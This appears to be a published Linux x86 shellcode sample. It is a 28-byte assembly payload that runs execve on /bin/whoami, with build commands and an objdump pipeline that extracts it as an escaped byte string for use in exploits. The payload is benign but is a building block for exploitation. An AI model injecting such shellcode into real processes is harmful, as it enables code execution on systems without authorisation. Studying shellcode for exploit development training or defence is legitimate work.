; execve x86 /bin/whoami - 28 bytes   by 0bfxgh0st*
;
; nasm -f elf execve_x86_whoami.asm
; ld -o execve_x86_whoami execve_x86_whoami.o -m elf_i386
; objdump -d execve_x86_whoami |grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'
section .text

global _start

_start:

xor eax,eax
xor ecx,ecx
xor edx,edx

push eax

push 0x696d616f
push 0x68772f6e
push 0x69622f2f

mov ebx,esp

mov al,11
int 0x80

